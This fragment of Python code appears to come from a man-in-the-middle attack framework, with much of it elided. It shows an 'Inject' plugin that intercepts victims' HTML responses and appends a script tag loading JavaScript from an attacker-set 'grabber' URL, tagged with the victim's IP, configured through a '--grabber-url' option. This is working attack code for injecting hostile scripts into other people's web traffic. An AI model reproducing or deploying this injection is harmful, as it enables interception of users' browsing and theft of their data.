...
class Inject(Plugin):
    ...
    def initialize(self, options):
        ...
        self.grabber_url   = options.grabber_url
    ...
    def response(self, response, request, data):
        ...
        if self._should_inject(ip, hn) and self._ip_filter(ip) and self._host_filter(hn) and (hn not in self.ip) and ("text/html" in mime):
            ...
            if html.body:
                ...
                if self.grabber_url:
                    script = html.new_tag('script', type='text/javascript', src=self.grabber_url + '?ip=' + request.clientInfo['clientip'])
                    html.body.append(script)
                    self.clientlog.info("Injected Grabber script: {}".format(hn), extra=request.clientInfo)
    ...
    def options(self, options):
        ...
        options.add_argument("--grabber-url", type=str, help="URL of the Grabber script")
